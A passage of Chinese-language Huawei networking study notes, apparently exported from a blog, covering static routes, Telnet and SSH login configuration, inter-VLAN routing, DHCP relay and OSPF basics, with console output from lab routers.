GigabitEthernet4/0/0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R5] R6&lt;R6&gt;syEnter system view, return user view with Ctrl+Z.[R6]int g4/0/0[R6-GigabitEthernet4/0/0]ip add 41.1.1.2 24Dec 21 2023 09:34:36-08:00 R6 %%01IFNET/4/LINK_STATE(l)[0]:The line protocol IP on the interface GigabitEthernet4/0/0 has entered the UP state. [R6-GigabitEthernet4/0/0]q [R6]ip route-static 192.168.3.0 24 41.1.1.1[R6]display ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 18 Routes : 19 Destination/Mask Proto Pre Cost Flags NextHop Interface 12.1.1.0/24 Static 60 0 RD 14.1.1.1 GigabitEthernet0/0/0 13.1.1.0/24 Static 60 0 RD 14.1.1.1 GigabitEthernet0/0/0 14.1.1.0/24 Direct 0 0 D 14.1.1.2 GigabitEthernet0/0/0 14.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 14.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 41.1.1.0/24 Direct 0 0 D 41.1.1.2 GigabitEthernet4/0/0 41.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet4/0/0 41.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet4/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0 192.168.1.0/24 Static 60 0 RD 14.1.1.1 GigabitEthernet0/0/0 192.168.2.0/24 Static 60 0 RD 14.1.1.1 GigabitEthernet0/0/0 192.168.3.0/24 Static 60 0 RD 14.1.1.1 GigabitEthernet0/0/0 Static 60 0 RD 41.1.1.1 GigabitEthernet4/0/0 192.168.4.0/24 Direct 0 0 D 192.168.4.254 GigabitEthernet0/0/1 192.168.4.254/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 192.168.4.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R6]ip route-static 192.168.3.0 24 41.1.1.1 preference 70Info: Succeeded in modifying route.[R6]display ip routing-tableRoute Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 18 Routes : 18 Destination/Mask Proto Pre Cost Flags NextHop Interface 12.1.1.0/24 Static 60 0 RD 14.1.1.1 GigabitEthernet0/0/0 13.1.1.0/24 Static 60 0 RD 14.1.1.1 GigabitEthernet0/0/0 14.1.1.0/24 Direct 0 0 D 14.1.1.2 GigabitEthernet0/0/0 14.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 14.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 41.1.1.0/24 Direct 0 0 D 41.1.1.2 GigabitEthernet4/0/0 41.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet4/0/0 41.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet4/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0 192.168.1.0/24 Static 60 0 RD 14.1.1.1 GigabitEthernet0/0/0 192.168.2.0/24 Static 60 0 RD 14.1.1.1 GigabitEthernet0/0/0 192.168.3.0/24 Static 60 0 RD 14.1.1.1 GigabitEthernet0/0/0 192.168.4.0/24 Direct 0 0 D 192.168.4.254 GigabitEthernet0/0/1 192.168.4.254/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 192.168.4.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R6]int g0/0/0[R6-GigabitEthernet0/0/0]shutdownDec 21 2023 09:45:33-08:00 R6 %%01IFPDT/4/IF_STATE(l)[1]:Interface GigabitEthernet0/0/0 has turned into DOWN state.[R6-GigabitEthernet0/0/0]Dec 21 2023 09:45:33-08:00 R6 %%01IFNET/4/LINK_STATE(l)[2]:The line protocol IP on the interface GigabitEthernet0/0/0 has entered the DOWN state. [R6-GigabitEthernet0/0/0]disp ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 11 Routes : 11 Destination/Mask Proto Pre Cost Flags NextHop Interface 41.1.1.0/24 Direct 0 0 D 41.1.1.2 GigabitEthernet4/0/0 41.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet4/0/0 41.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet4/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0 192.168.3.0/24 Static 70 0 RD 41.1.1.1 GigabitEthernet4/0/0 192.168.4.0/24 Direct 0 0 D 192.168.4.254 GigabitEthernet0/0/1 192.168.4.254/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 192.168.4.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R6-GigabitEthernet0/0/0]undo shutdown[R6-GigabitEthernet0/0/0]Dec 21 2023 09:48:22-08:00 R6 %%01IFPDT/4/IF_STATE(l)[3]:Interface GigabitEthernet0/0/0 has turned into UP state.[R6-GigabitEthernet0/0/0]Dec 21 2023 09:48:22-08:00 R6 %%01IFNET/4/LINK_STATE(l)[4]:The line protocol IP on the interface GigabitEthernet0/0/0 has entered the UP state. [R6-GigabitEthernet0/0/0] 缺省路由去往任意网段的路由. ip route-static 0.0.0.0 0 下一跳地址"},{"title":"","date":"2023-12-21T06:00:00.000Z","updated":"2023-12-21T06:00:00.000Z","comments":true,"path":"notes/datacom/14.html","permalink":"https://blog.mhuig.top/notes/datacom/14","excerpt":"","text":"远程登录 远程登录 telnet 线路认证[R2]telnet server enable // 开启Telent服务[R2]user-interface vty 0 4 // 进入虚拟终端线路配置用户[R2-ui-vty0-4]protocol inbound telnet // 设置用户登录方式[R2-ui-vty0-4]authentication-mode password // 认证模式为密码认证[R2-ui-vty0-4]set authentication password cipher 123456[R2-ui-vty0-4]user privilege level 15 // 设置用户等级 用户视图 telenet x.x.x.x R2&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy R2[R2]int g0/0/0[R2-GigabitEthernet0/0/0]ip add 34.1.1.2 24[R2-GigabitEthernet0/0/0][R2-GigabitEthernet0/0/0]q[R2]telnet server enable Error: TELNET server has been enabled[R2]user-interface vt [R2]user-interface vty 0 4[R2-ui-vty0-4]protocol inbound telnet [R2-ui-vty0-4]display this [V200R003C00]#user-interface con 0 authentication-mode passworduser-interface vty 0 4user-interface vty 16 20#return[R2-ui-vty0-4]authentication-mode ? aaa AAA authentication password Authentication through the password of a user terminal interface[R2-ui-vty0-4]authentication-mode password ? &lt;cr&gt; Please press ENTER to execute command [R2-ui-vty0-4]authentication-mode passwordPlease configure the login password (maximum length 16):123456[R2-ui-vty0-4]user privilege ? level Set the login priority of a user terminal[R2-ui-vty0-4]user privilege level ? INTEGER&lt;0-15&gt; Set a priority, the default value is 0[R2-ui-vty0-4]user privilege level 15[R2-ui-vty0-4] R1&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy R1[R1]int g0/0/0[R1-GigabitEthernet0/0/0]ip add 34.1.1.1 24Dec 21 2023 11:45:03-08:00 R1 %%01IFNET/4/LINK_STATE(l)[0]:The line protocol IP on the interface GigabitEthernet0/0/0 has entered the UP state. [R1-GigabitEthernet0/0/0]q[R1]q&lt;R1&gt;telnet 34.1.1.2 Press CTRL_] to quit telnet mode Trying 34.1.1.2 ... Connected to 34.1.1.2 ...Login authenticationPassword:&lt;R2&gt; telnet 本地用户认证[R2]telnet server enable // 开启Telent服务[R4]aaa[R4-aaa]local-user testuser password cipher 123456 // 创建用户并设置密码[R4-aaa]local-user testuser privilege level 2 // 设置用户等级[R4-aaa]local-user testuser service-type telnet // 用户的登录方式[R4]user-interface vty 0 4[R4-ui-vty0-4]authentication-mode aaa // 认证模式为aaa认证 R4&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy R4[R4]int g0/0/0[R4-GigabitEthernet0/0/0]ip add 56.1.1.2 24[R4-GigabitEthernet0/0/0]q[R4]telnet server enable Error: TELNET server has been enabled[R4]aaa[R4-aaa][R4-aaa][R4-aaa][R4-aaa]local-user testuser password cipher 123456Info: Add a new user.[R4-aaa]dis this [V200R003C00]#aaa authentication-scheme default authorization-scheme default accounting-scheme default domain default domain default_admin local-user admin password cipher %$%$K8m.Nt84DZ}e#&lt;0`8bmE3Uw}%$%$ local-user admin service-type http local-user testuser password cipher %$%$HPm[~yFOaU!LuC#'ZSi@Pc''%$%$#return[R4-aaa]local-user testuser privilege level 2[R4-aaa]local-user testuser service-type telnet[R4-aaa][R4-aaa]local-user test2 password cipher 456789Info: Add a new user.[R4-aaa]local-user test2 privilege level 3[R4-aaa]local-user test2 service-type telnet[R4-aaa]q[R4]user-interface vty 0 4[R4-ui-vty0-4]authentication-mode aaa R3&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy R3[R3]int g0/0/0[R3-GigabitEthernet0/0/0]ip add 56.1.1.1 24&lt;R3&gt;&lt;R3&gt;telnet 56.1.1.2 Press CTRL_] to quit telnet mode Trying 56.1.1.2 ... Connected to 56.1.1.2 ...Login authenticationUsername:testuserPassword:&lt;R4&gt; SSHSSH: 是一种加密的远程登录协议, 采 用非对称加密方式. 对称加密: 两端采用同样的密钥进行数据的加密和解密, 一旦密钥被泄露, 则数据安全无法保障. 非对称加密: 双方都拥有自己的公钥和私钥, 双方都将自己的公钥告知对方, 并要求对方使用自己的公钥加密, 通过公钥加密的数据只能通过对应的私钥解密, 公钥可以被传递到网络中, 私钥只能本地保存, 不能被传递. PC[PC]rsa local-key-pair create // 创建密钥对[PC]ssh client first-time enable // 开启首次登录[PC]stelnet x.x.x.x SSH_SERVER[SSH_SERVER]stelnet server enable // 开启ssh服务// 创建SSH认证登录所需的用户信息.[SSH_SERVER]aaa[SSH_SERVER-aaa]local-user sshuser password cipher 123456[SSH_SERVER-aaa]local-user sshuser privilege level 3[SSH_SERVER-aaa]local-user sshuser service-type ssh //设置用户为SSH用户// 配置vty线路认证[SSH_SERVER]user-interface vty 0 4[SSH_SERVER-ui-vty0-4]authentication-mode aaa[SSH_SERVER-ui-vty0-4]protocol inbound ssh// 通过RSA算法生成密钥对[SSH_SERVER]rsa local-key-pair create R2&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy SSH_SERVER[SSH_SERVER]int g0/0/0[SSH_SERVER-GigabitEthernet0/0/0]ip add 12.1.1.2 24[SSH_SERVER]stelnet server enable Info: Succeeded in starting the STELNET server.[SSH_SERVER][SSH_SERVER]aaa[SSH_SERVER-aaa]local-user sshuser password cipher 123456Info: Add a new user.[SSH_SERVER-aaa]local-user sshuser privilege level 3[SSH_SERVER-aaa]local-user sshuser service-type ssh[SSH_SERVER-aaa]q[SSH_SERVER]user-interface vty 0 4[SSH_SERVER-ui-vty0-4]authentication-mode aaa[SSH_SERVER-ui-vty0-4]protocol inbound ? all All protocols ssh SSH protocol telnet Telnet protocol[SSH_SERVER-ui-vty0-4]protocol inbound ssh[SSH_SERVER]rsa local-key-pair create The key name will be: Host% RSA keys defined for Host already exist.Confirm to replace them? (y/n)[n]:yThe range of public key size is (512 ~ 2048).NOTES: If the key modulus is greater than 512, It will take a few minutes.Input the bits in the modulus[default = 512]:1024Generating keys......................++++++..........................++++++.............++++++++.++++++++[SSH_SERVER] R1&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei] sy PC[PC]int g0/0/0[PC-GigabitEthernet0/0/0]ip add 12.1.1.1 24[PC][PC]rsa local-key-pair create The key name will be: Host% RSA keys defined for Host already exist.Confirm to replace them? (y/n)[n]:yThe range of public key size is (512 ~ 2048).NOTES: If the key modulus is greater than 512, It will take a few minutes.Input the bits in the modulus[default = 512]:1024Generating keys....++++++........++++++......++++++++......................++++++++[PC][PC]ssh client first-time enable [PC]stelnet 12.1.1.2Please input the username:sshuserTrying 12.1.1.2 ...Press CTRL+K to abortConnected to 12.1.1.2 ...The server is not authenticated. Continue to access it? (y/n)[n]:yDec 21 2023 15:02:27-08:00 PC %%01SSH/4/CONTINUE_KEYEXCHANGE(l)[0]:The server had not been authenticated in the process of exchanging keys. When deciding whether to continue, the user chose Y. [PC]Save the server's public key? (y/n)[n]:yThe server's public key will be saved with the name 12.1.1.2. Please wait...Dec 21 2023 15:02:32-08:00 PC %%01SSH/4/SAVE_PUBLICKEY(l)[1]:When deciding whether to save the server's public key 12.1.1.2, the user chose Y. [PC]Enter password:&lt;SSH_SERVER&gt;"},{"title":"","date":"2023-12-25T06:00:00.000Z","updated":"2023-12-25T06:00:00.000Z","comments":true,"path":"notes/datacom/15.html","permalink":"https://blog.mhuig.top/notes/datacom/15","excerpt":"","text":"实现 VLAN 间通信 实现 VLAN 间通信 使用路由器物理接口 R1&lt;Huawei&gt;sy[Huawei]sy R1[R1]int g0/0/0[R1-GigabitEthernet0/0/0]ip add 192.168.1.254 24[R1-GigabitEthernet0/0/0]int g0/0/1[R1-GigabitEthernet0/0/1]ip add 192.168.2.254 24[R1-GigabitEthernet0/0/1] SW1&lt;Huawei&gt;sy[Huawei]sy SW1[SW1]vlan batch 10 20[SW1]interface g0/0/1[SW1-GigabitEthernet0/0/1]p l a[SW1-GigabitEthernet0/0/1]p d vlan 10[SW1-GigabitEthernet0/0/1]int g0/0/2[SW1-GigabitEthernet0/0/2][SW1-GigabitEthernet0/0/2]p l a[SW1-GigabitEthernet0/0/2]p d vlan 10[SW1-GigabitEthernet0/0/2]int g0/0/3[SW1-GigabitEthernet0/0/3]p l a[SW1-GigabitEthernet0/0/3]p d vlan 20[SW1-GigabitEthernet0/0/3][SW1-GigabitEthernet0/0/3]int g0/0/4[SW1-GigabitEthernet0/0/4]p l a[SW1-GigabitEthernet0/0/4]p d vlan 20[SW1-GigabitEthernet0/0/4] 子接口 单臂路由单臂路由子接口: 路由器共用一个物理接口, 是路由器上的虚拟接口, 多个子接口可以共用一个物理接口, 每个子接口属于一个单独的网络, 每个子接口可以和同一个 VLAN 的设备通信, 通过 dot.1q(802.1q) 的标签区分不同子接口的数据, 连接子接口的交换机需要使用 Trunk 端口. R1[R1]int g0/0/1[R1-GigabitEthernet0/0/1]undo ip add 192.168.2.254 24[R1-GigabitEthernet0/0/1]q[R1]int g0/0/0[R1-GigabitEthernet0/0/0]undo ip add 192.168.1.254 24[R1-GigabitEthernet0/0/1]q[R1]int g0/0/0.? &lt;1-4096&gt; GigabitEthernet interface subinterface number[R1]int g0/0/0.10[R1-GigabitEthernet0/0/0.10]dot1q termination vid 10[R1-GigabitEthernet0/0/0]int g0/0/0.10[R1-GigabitEthernet0/0/0.10]ip add 192.168.1.254 24[R1-GigabitEthernet0/0/0.10]arp broadcast enable [R1-GigabitEthernet0/0/0.10]int g0/0/0.20[R1-GigabitEthernet0/0/0.20]dot1q termination vid 20[R1-GigabitEthernet0/0/0.20]ip add 192.168.2.254 24[R1-GigabitEthernet0/0/0.20]arp broadcast enable &lt;R1&gt;dis cu# sysname R1#interface GigabitEthernet0/0/0#interface GigabitEthernet0/0/0.10 dot1q termination vid 10 ip address 192.168.1.254 255.255.255.0 arp broadcast enable#interface GigabitEthernet0/0/0.20 dot1q termination vid 20 ip address 192.168.2.254 255.255.255.0 arp broadcast enable# SW1[SW1-GigabitEthernet0/0/1]int g0/0/1[SW1-GigabitEthernet0/0/1]undo port default vlan[SW1-GigabitEthernet0/0/1]undo port link-type[SW1-GigabitEthernet0/0/1]int g0/0/2[SW1-GigabitEthernet0/0/2]undo port default vlan[SW1-GigabitEthernet0/0/2]undo port link-type[SW1-GigabitEthernet0/0/2]int g0/0/3[SW1-GigabitEthernet0/0/3]undo port default vlan[SW1-GigabitEthernet0/0/3]undo port link-type[SW1-GigabitEthernet0/0/3]int g0/0/4[SW1-GigabitEthernet0/0/4]undo port default vlan[SW1-GigabitEthernet0/0/4]undo port link-type [SW1-GigabitEthernet0/0/4][SW1-GigabitEthernet0/0/4]int g0/0/1[SW1-GigabitEthernet0/0/1]port link-type trunk [SW1-GigabitEthernet0/0/1]port trunk allow-pass vlan 10 20[SW1-GigabitEthernet0/0/1]int g0/0/2[SW1-GigabitEthernet0/0/2]port link-type access [SW1-GigabitEthernet0/0/2]port default vlan 10[SW1-GigabitEthernet0/0/2]int g0/0/3[SW1-GigabitEthernet0/0/3]port link-type access [SW1-GigabitEthernet0/0/3]port default vlan 20&lt;SW1&gt;dis cu#sysname SW1#vlan batch 10 20#interface GigabitEthernet0/0/1 port link-type trunk port trunk allow-pass vlan 10 20#interface GigabitEthernet0/0/2 port link-type access port default vlan 10#interface GigabitEthernet0/0/3 port link-type access port default vlan 20# SVI 接口 三层交换机 vlanif三层交换 SVI 接口: 交换机虚拟接口, 只逻辑存在, 每一个 SVI 接口对应一个 VLAN, 可以配置 IP 地址, 可以和 VLAN 内设备通信, 并且可以生成路由信息, 实现基本路由功能. SW2[SW2]vlan batch 10 20[SW2]int g0/0/1[SW2-GigabitEthernet0/0/1]p l a[SW2-GigabitEthernet0/0/1]p d vlan 10[SW2-GigabitEthernet0/0/1]int g0/0/2[SW2-GigabitEthernet0/0/2]p l a[SW2-GigabitEthernet0/0/2]p d vlan 20[SW2]int Vlanif 10[SW2-Vlanif10]ip add 192.168.1.254 24[SW2-Vlanif10]int vlanif 20[SW2-Vlanif20]ip add 192.168.2.254 24[SW2-Vlanif20]dis cu#sysname SW2#vlan batch 10 20#interface Vlanif1#interface Vlanif10 ip address 192.168.1.254 255.255.255.0#interface Vlanif20 ip address 192.168.2.254 255.255.255.0#interface MEth0/0/1#interface GigabitEthernet0/0/1 port link-type access port default vlan 10#interface GigabitEthernet0/0/2 port link-type access port default vlan 20# 应用场景单臂路由适用于小型企业网或特殊网络. 大中型企业网一般使用三层交换实现局域网内部通信. 多层交换机和路由器的区别多层交换机具备一定的基础路由功能, 可以在某些场景下代替路由器. 但交换机的功能相对单一, 路由器可以实现不同协议之间的数据转发. 一般三层交换机不支持 NAT, 所以在企业网边缘需要路由器或防火墙. 三层交换机一般用于企业内部数据转发以及控制. 路由器一般用于企业边界数据转发. 单臂路由 - 三层交换机 - DHCP SW1#sysname SW1#vlan batch 10 to 30#interface GigabitEthernet0/0/1 port link-type trunk port trunk allow-pass vlan 10 20#interface GigabitEthernet0/0/2 port link-type access port default vlan 10#interface GigabitEthernet0/0/3 port link-type access port default vlan 20# R1# sysname R1#dhcp enable#ip pool PC gateway-list 30.1.1.254 network 30.1.1.0 mask 255.255.255.0 lease day 0 hour 0 minute 10 dns-list 114.114.114.114 #interface GigabitEthernet0/0/0#interface GigabitEthernet0/0/0.10 dot1q termination vid 10 ip address 10.1.1.254 255.255.255.0 arp broadcast enable dhcp select interface dhcp server lease day 0 hour 0 minute 30 dhcp server dns-list 114.114.114.114 #interface GigabitEthernet0/0/0.20 dot1q termination vid 20 ip address 20.1.1.254 255.255.255.0 arp broadcast enable dhcp select interface dhcp server lease day 0 hour 0 minute 30 dhcp server dns-list 114.114.114.114 #interface GigabitEthernet0/0/1 ip address 12.1.1.1 255.255.255.0 dhcp select global##ip route-static 30.1.1.0 255.255.255.0 12.1.1.2# SW2#sysname SW2#vlan batch 10 to 30#dhcp enable##interface Vlanif12 ip address 12.1.1.2 255.255.255.0#interface Vlanif30 ip address 30.1.1.254 255.255.255.0 dhcp select relay dhcp relay server-ip 12.1.1.1#interface GigabitEthernet0/0/1 port link-type access port default vlan 12#interface GigabitEthernet0/0/2 port link-type access port default vlan 30#interface GigabitEthernet0/0/3 port link-type access port default vlan 30##ip route-static 0.0.0.0 0.0.0.0 12.1.1.1#"},{"title":"","date":"2023-12-26T06:00:00.000Z","updated":"2023-12-26T06:00:00.000Z","comments":true,"path":"notes/datacom/16.html","permalink":"https://blog.mhuig.top/notes/datacom/16","excerpt":"","text":"OSPF 基础 OSPF 基础 动态路由AS (自治系统): 由同一个技术机构进行管理并且运行相同的路由选路策略的一组路由器. 动态路由分类按照使用范围分类: IGP: 内部网关协议, 运行于 AS 内部的路由协议 (RIP, OSPF, IS - IS) EGP: 外部网关协议, 运行于 AS 之间的路由协议 (BGP) 按照算法分类: 距离矢量路由协议: 通过距离和矢量两个参数来描述一个路由信息进行计算, 距离指的是由多远能到达目标 (开销, 跳数). (RIP, BGP) 链路状态路由协议: 通过每台路由器自动生成链路状态信息, 通过在一定的区域内交互链路状态信息, 得到区域内完整的拓扑, 最终通过最短路径树算法, 计算得到最优的树状路径. (OSPF IS - IS) 按照主类进行分类: 有类路由协议: 在传递信息时, 不携带掩码, 根据传递路由的主类网络以及接收路由的接口掩码的配置, 自动计算路由. (RIPv1) 无类路由协议: 在传递信息时, 协议带子网掩码, 可以支持更广泛的应用, 支持 VLSM, CIDR. (RIPv2, OSPF, IS - IS, BGP) 动态路由特点路由器通过动态路由协议自动计算得到的路由信息可以根据网络的变化自动进行路由表的改变. 可以减少网络的管理任务. 动态路由协议会占用部分网络的带宽. 可以实现路由的自动调整. 链路状态LS: 链路状态, 设备直接相连的网络或节点信息. LSA: 链路状态通告. LSDB: 链路状态数据库, 是所有 LSA 的集合. SPF: 最短路径树算法. OSPF 工作原理 建立邻居关系. 泛洪 LSA, 并同步 LSDB. 根据 SPF 算法计算最优路径. 将计算得出的路由放入到路由表中. 区域AREA: 区域, OSPF 通过区域可以实现网络的分层, 并实现管理域的隔离, 缩小 LSDB 的规模, 每个 OSPF 设备在运行时需要指定接口所在的区域, 每个区域会有一个区域号进行标识, 一般写作点分十进制. 区域是从逻辑上将设备分为不同的组. OSPF 区域分为两层: 骨干区域: 固定的区域号为 0 或 0.0.0.0 必须有且只能有一个. 非骨干区域: AS 内可以存在多个非骨干区域, 区域号非 0, 所有的非骨干区域和骨干区域相连, 非骨干区域之间不能相连. 路由器角色IR: 区域内部路由器, 所有的接口属于同一个 OSPF 区域的路由器. BR: 骨干路由器, 至少有一个路由器接口运行于 OSPF 的骨干区域的路由器. ABR: 区域边界路由器, 连接多个区域且所连接的区域中包括骨干区域的路由器. ASBR: 自治系统边界路由器, OSPF 中, AS 和 AS 相连的路由, 一般在 ASBR 上将其他 AS 路由注入进 OSPF 中形成 OSPF 外部路由. Router-ID32bit 的无符号整数, 每个 OSPF 设备在网络中的唯一标识, 经常用点分十进制表示, 每个设备在运行 OSPF 的 AS 内都有唯一的 RID. 生成规则 如果手工配置了 RID, 则手工配置优先. 如果没有手工配置, 则设备会使用最大的 lookback 接口 IP 作为 RID. 如果没有 lookback 接口, 则优选物理接口最大的 IP 地址作为 RID. 全局 RID默认情况下, 设备的全局标识. 协议 RID默认情况下, 路由协议会使用全局 RID 作为协议 RID, 如果手工指定协议 RID, 则优先使用手工指定的 RID. CostOSPF 以 cost 作为度量值, 是一个 16bit 正整数, 取值范围 1-65535, 数值越小越优. OSPF 计算的开销是到达目的网络所有链路的总开销, 从目的到本设备的入向接口开销总和. cost 只与带宽有关. cost = 参考带宽值/接口带宽值 (参考带宽值 100Mbit/s) 如果修改参考带宽值, 所有 OSPF 设备都要修改. OSPF 报文Hello: 用于发现, 建立以及维持邻居关系. DD: 数据库描述信息, 相当于 LSDB 的摘要信息, 在路由器之间选举主从. LSR: 链路状态请求, 用于请求特定的 LSA. LSU: 链路状态更新, 用于响应 LSR, 进行 LSA 的更新. LSACK: 链路状态确认, 对 LSU 中的信息进行确认. 建立邻居关系R1 R2down ==&gt; hello (RID: 1.1.1.1 neighbor list: null) ==&gt; init &lt;== hello (RID: 2.2.2.2 neighbor list: 1.1.1.1) &lt;==2-way init ==&gt; hello (RID: 1.1.1.1 neighbor list: 2.2.2.2) ==&gt; 2-wayEXstart ==&gt; DD (1.1.1.1) X ===============================&gt; &lt;== DD (2.2.2.2) Y &lt;===============================EXchange ==&gt; DD (LSDB) Y ===============================&gt; &lt;== DD (LSDB) Y+1 &lt;=============================== EXchange ==&gt; DD Y+1 ===============================&gt;Loading ==&gt; LSR ================================&gt; &lt;== LSU &lt;================================ ==&gt; LSACK ================================&gt; ..........Full Full OSPF 状态机DOWN: 表示 OSPF 失效状态, 当前状态下无法和其他路由器建立邻居关系. Init: 初始化状态, 表示收到 OSPF Hello 报文, 但报文中不包含自身的 RID, 也就是此时其他路由器并不知道自身的存在. 2-way: 双向通信状态, 表示收到 OSPF Hello 报文, 且收到的报文中包含自身设备的 RID, 此时已经和邻居建立双向通信. EXstart: OSPF 设备会交互空的 DD 报文用于 OSPF 邻接关系的主从选举. EXchange: OSPF 会发送 DD 报文来描述自身数据库信息. Loading: OSPF 设备通过发送 LSR 对特定的 LSA 进行请求, 并等待对方更新. 被请求设备将 LSA 放入到 LSU 中发送过去, 并等待对方的 ACK. 收到的设备需要对其确认. FULL: 当 LSDB 同步完成时, 进入此状态也就是邻接状态. OSPF 邻接状态建立过程第一步: 当邻居状态变为 EXstart 时, RTA 回会向 RTB 发送第一个 DD 报文, 在这个报文中, 序列号为 X, RTA 宣告自己为主路由器. 此时 RTB 也向 RTA 发送自己的第一个 DD 报文, 在这个报文中, 假设 DD 报文的序列号为 Y, RTB 也宣告自己为主路由器, 由于 RTB 的 RID 比 RTA 大, 所以 RTB 成为真正的主路由器. 第二步: RTA 发送一个新的 DD 报文, 在这个报文中, 携带着 LSDB 的描述信息. 序列号设置为 RTB 在上一个 DD 报文中的序列号, 此时 RTB 的状态改为 EXchange. 第三步: 邻居状态变为 EXchange 之后, RTB 发送一个新的 DD 报文, 该报文包含着 LSDB 的描述信息, DD 报文的序列号为 Y + 1 (上次使用的序列号 + 1). 第四步: 即使 RTA 不需要新的 DD 报文来描述自己的 LSDB, 但作为从路由器, RTA 需要对主路由器 RTB 发送的每一个 DD 报文进行确认, 所以, RTA 向 RTB 发送一个内容为空的 DD 报文, 序列号采用 RTB 上次发送的序列号 (表示确认). 第五步: 发送完最后一个 DD 报文后, RTA 将状态改为 Loading, RTB 收到最后一个 DD 报文后状态改为 FULL (假设 RTB 的 LSDB 是完整的, 不需要向 RTA 请求更新). OSPF 所支持的网络类型 BMA: 广播型多路访问, 当链路层为以太网时, 此网络中带有广播功能, 也是 OSPF 默认的网路类型, 在此网络类型下需要进行 DR 和 BDR 的选举. NBMA: 非广播型多路访问, 无法发送广播和组播报文, 只能够通过单播形式来寻找邻居, 在此网络类型下, 也会进行 DR 和 BDR 的选举. P2P: 点到点网络, 接口通过点到点的形式与另一台路由器相连, 在此网络类型下不需要选举 DR 和 BDR. P2MP: 点到多点, 是一种特殊的网络类型, P2MP 必须由其他网络类型强制修改, 不选举 DR 和 BDR. 对于不同网络类型的区别 网络类型 Hello Dead DR/BDR BMA 10 40 选举 NBMA 30 120 选举 P2P 10 40 无 P2MP 30 120 无 DR/BDR不用 DR 邻接关系数量: 使用 DR 邻接关系数量: 在 MA 网络中有 N 台设备且形成两两邻接关系则网络内邻接关系数量为 . 在 MA 网络中设备之间建立邻接关系, 需要维护的邻接关系随着设备的增加而大幅度增加. 每两台设备之间两两交互 LSA, 会导致 LSA 的重复发送, 导致网络计算效率低. DR: 指定路由器, 在每个 OSPF 的 MA 网络中, 都会选举一个 DR 设备, DR 设备会和每台设备建立邻接关系, 并交互 LSA, 同时将自身收集到的 LSA 交互给每台设备. BDR: 备份指定路由器, 为了防止 DR 设备失效造成的单点故障, 在 MA 网络中也会选举 BDR 设备, BDR 也会与其他成员建立邻接关系, 同时监听 DR 的状态, 如果 DR 失效, 则 BDR 成为新的 DR. DR Other: 除 DR 以外其他路由器, DR Other 之间只建立邻居关系. 每一个广播范围内选择一个 DR / BDR. 2-way 状态下完成 DR / BDR 选举. DR 和 BDR 选举每台运行 OSPF 的路由器都有接口优先级. 默认值 1. 当优先级为 0 时, 表示该设备放弃参选. 255 最大值. 优先级大于 0 的设备进行选举, 优先级越大越优. 如果优先级一致, 则比较 RID, RID 越大越优. OSPF 的组播组224.0.0.5: 所有的路由器都监听的地址 DR / BDR 发送的 OSPF 报文目标地址都是 224.0.0.5 在广播型网络中所有的路由器都以 224.0.0.5 为目标地址发送 Hello 报文. DR / BDR 会将 LSA 的更新发向 224.0.0.5 224.0.0.6: DR / BDR 监听的地址 DR Other 发送的 OSPF 报文的目标地址为 224.0.0.6 DR Other 会将 LSA 的更新发向 224.0.0.6 Shell - 全局 OSPF 配置 interface LoopBack0 ip address 11.11.11.11 255.255.255.255 #ospf 1 router-id 1.1.1.1 // 创建OSPF进程, 配置RID area 0.0.0.0 // 创建区域 network 11.11.11.11 0.0.0.0 // 宣告接口 network 12.1.1.1 0.0.0.0 ######################[R1]dis ip routing-tableRoute Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 11 Routes : 11 Destination/Mask Proto Pre Cost Flags NextHop Interface 11.11.11.11/32 Direct 0 0 D 127.0.0.1 LoopBack0 12.1.1.0/24 Direct 0 0 D 12.1.1.1 GigabitEthernet0/0/0 12.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 12.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 22.22.22.22/32 OSPF 10 1 D 12.1.1.2 GigabitEthernet0/0/0 23.1.1.0/24 OSPF 10 2 D 12.1.1.2 GigabitEthernet0/0/0 